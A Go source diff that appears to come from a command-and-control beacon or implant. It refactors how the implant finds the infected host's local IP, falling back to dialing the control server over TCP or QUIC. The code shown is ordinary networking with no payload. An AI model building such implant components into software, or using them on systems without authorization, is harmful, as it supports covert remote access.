@@ -173,36 +173,102 @@ func EstablishConnection(config *tls.Config, ServerIP, ServerPort, TransportProt
 	}
 }
 
-func GetLocalIP(beacon io.ReadWriteCloser) string {
+func GetLocalIP(beacon io.ReadWriteCloser, serverIP, serverPort, transportProtocol string) string {
 	type localAddresser interface {
 		LocalAddr() net.Addr
 	}
 
-	la, ok := beacon.(localAddresser)
-	if !ok {
-		return "unknown"
+	if la, ok := beacon.(localAddresser); ok {
+		if ip := ipFromAddr(la.LocalAddr()); ip != "" {
+			return ip
+		}
 	}
 
-	addr := la.LocalAddr()
+	return detectOutboundIP(serverIP, serverPort, transportProtocol)
+}
+
+func ipFromAddr(addr net.Addr) string {
 	if addr == nil {
-		return "unknown"
+		return ""
 	}
 
 	switch a := addr.(type) {
 	case *net.TCPAddr:
-		return a.IP.String()
+		return normalizeIP(a.IP)
 	case *net.UDPAddr:
-		return a.IP.String()
+		return normalizeIP(a.IP)
 	case *net.IPAddr:
-		return a.IP.String()
+		return normalizeIP(a.IP)
 	default:
-		// Fallback: parse "IP:port"
 		host, _, err := net.SplitHostPort(addr.String())
-		if err == nil {
+		if err == nil && host != "" {
 			return host
 		}
 	}
-	return "unknown"
+	return ""
+}
+
+func normalizeIP(ip net.IP) string {
+	if ip == nil {
+		return ""
+	}
+
+	if ip.IsUnspecified() {
+		return ""
+	}
+
+	if v4 := ip.To4(); v4 != nil {
+		return v4.String()
+	}
+	return ip.String()
+}
+
+func detectOutboundIP(serverIP, serverPort, transportProtocol string) string {
+	target := net.JoinHostPort(serverIP, serverPort)
+	ip := net.ParseIP(serverIP)
+
+	var network string
+
+	switch strings.ToUpper(transportProtocol) {
+	case "TCP":
+		if ip != nil {
+			if ip.To4() != nil {
+				network = "tcp4"
+			} else {
+				network = "tcp6"
+			}
+		} else {
+			network = "tcp"
+		}
+	case "QUIC":
+		if ip != nil {
+			if ip.To4() != nil {
+				network = "udp4"
+			} else {
+				network = "udp6"
+			}
+		} else {
+			network = "udp"
+		}
+	default:
+		if ip != nil {
+			if ip.To4() != nil {
+				network = "tcp4"
+			} else {
+				network = "tcp6"
+			}
+		} else {
+			network = "tcp"
+		}
+	}
+
+	conn, err := net.Dial(network, target)
+	if err != nil {
+		return "unknown"
+	}
+	defer conn.Close()
+
+	return ipFromAddr(conn.LocalAddr())
 }
 
 func HandleError(beacon io.ReadWriteCloser, reqType string, err error) {
